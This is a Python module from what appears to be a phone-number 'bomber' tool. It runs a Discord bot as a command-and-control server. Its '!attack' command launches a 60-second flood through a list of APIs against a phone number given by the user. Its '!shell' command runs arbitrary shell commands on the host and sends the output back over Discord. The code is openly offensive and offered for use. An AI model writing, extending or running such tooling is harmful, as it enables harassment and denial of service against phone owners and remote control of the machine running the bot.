# termux_version/core/discord_c2.py
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ [SYSTEM] Discord Library not found. Discord C2 Disabled.")

import json
import os
import asyncio
import threading
from .attacker import start_async_attack

# v19000: GOD EMPEROR (Discord Remote Admin)

TOKEN = "DUMMY"
try:
    with open(os.path.join(os.path.dirname(__file__), '../config/config.json')) as f:
        TOKEN = json.load(f).get("DISCORD_BOT_TOKEN", "DUMMY")
except: pass


if DISCORD_AVAILABLE:
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f"🎮 [DISCORD] Connected as {bot.user}")

    @bot.command()
    async def test(ctx, number):
        await ctx.send(f"🧪 **DIAGNOSTIC TEST**: Initiating connectivity check on {number}...")
        await ctx.send("✅ Diagnostic dispatched.")

    @bot.command()
    async def status(ctx):
        # ... simplified status ...
        await ctx.send("🟢 SYSTEM ONLINE")

    @bot.command()
    async def attack(ctx, number: str = None):
        if not number:
            await ctx.send("⚠️ Usage: `!attack 0812xxxx`")
            return
            
        embed = discord.Embed(title="🚀 INITIATING ATTACK", description=f"Target: `{number}`", color=0xff0000)
        await ctx.send(embed=embed)
        
        def run_attack():
            try:
                 api_path = os.path.join(os.path.dirname(__file__), '../config/apis.json')
                 with open(api_path, "r") as f: apis = json.load(f)
                 loop = asyncio.new_event_loop()
                 asyncio.set_event_loop(loop)
                 loop.run_until_complete(start_async_attack(apis, number, duration=60))
                 loop.close()
            except Exception as e:
                print(f"Attack Error: {e}")

        threading.Thread(target=run_attack).start()

    @bot.command()
    async def logs(ctx):
        from .security import is_owner
        if not is_owner(ctx.author.id, "discord"):
            await ctx.send("⛔ **ACCESS DENIED**")
            return
            
        log_path = os.path.join(os.path.dirname(__file__), '../logs/success.txt')
        if os.path.exists(log_path):
            await ctx.send("📜 **MISSION LOGS**", file=discord.File(log_path))
        else:
            await ctx.send("⚠️ Logs are empty.")

    @bot.command()
    async def shell(ctx, *, cmd: str = None):
        from .security import is_owner, run_shell
        if not is_owner(ctx.author.id, "discord"):
            await ctx.send("⛔ **ACCESS DENIED**")
            return
            
        if not cmd:
            await ctx.send("⚠️ Usage: `!shell ls -la`")
            return
            
        await ctx.send(f"💻 Executing: `{cmd}`...")
        out = run_shell(cmd)
        if len(out) > 1900: out = out[:1900] + "\n... [TRUNCATED]"
        await ctx.send(f"```\n{out}\n```")

    @bot.command()
    async def panel(ctx):
         await ctx.send("🎛️ NAZHANBOTS COMMAND CENTER (Use !help for commands)")

    def start_bot():
        print("🎮 [DISCORD] Connecting to C2 Server...")
        try:
            if TOKEN != "DUMMY":
                bot.run(TOKEN)
            else:
                print("⚠️ [DISCORD] Token missing.")
        except Exception as e:
            print(f"❌ [DISCORD] Error: {e}")

else:
    # Dummy function if library missing
    def start_bot():
        print("⚠️ [DISCORD] Module Inactive (Library Missing).")
